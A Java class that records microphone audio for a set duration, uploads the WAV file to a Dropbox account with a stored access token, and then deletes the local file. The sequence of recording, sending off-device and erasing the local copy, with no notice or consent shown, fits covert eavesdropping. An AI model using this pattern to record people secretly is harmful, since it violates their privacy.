import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.sound.sampled.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

public class JavaSoundRecorder
{
    private AudioFileFormat.Type fileType;
    private TargetDataLine line;
    private AudioFormat audioFormat;

    public JavaSoundRecorder()
    {
        fileType = AudioFileFormat.Type.WAVE;

        float sampleRate = 8000;
        int sampleSizeInBits = 8;
        int channels = 1;
        boolean signed = true;
        boolean bigEndian = true;
        audioFormat = new AudioFormat(
                sampleRate, sampleSizeInBits, channels, signed, bigEndian
        );
        DataLine.Info info = new DataLine.Info(
                TargetDataLine.class, audioFormat
        );
        try {
            line = (TargetDataLine) AudioSystem.getLine(info);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
    }

    public void recordSound(long milliseconds, String filePath)
    {

        File file = new File(filePath);
        start(file);
        delayFinish(milliseconds, filePath);
    }

    private void start(File file)
    {
        new Thread(() ->
        {
            try {
                line.open(audioFormat);
                line.start();
                AudioInputStream ais = new AudioInputStream(line);
                AudioSystem.write(ais, fileType, file);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }).start();
    }

    private void delayFinish(long delayTime, String filePath)
    {
        new Thread(() ->
        {
            try
            {
                Thread.sleep(delayTime);
                line.stop();
                line.close();
                SendToDropbox(filePath);
                DeleeteFile(filePath);
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void SendToDropbox(String filePath){

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, Main.ACCESS_TOKEN);
        try (InputStream in = new FileInputStream(filePath)) {
            FileMetadata metadata = client.files().uploadBuilder("/" + filePath)
                    .uploadAndFinish(in);
        }
        catch (Exception ex){
            ex.printStackTrace();
        }
    }

    public void DeleeteFile(String filePath){
        File file = new File(filePath);
        file.delete();
    }

}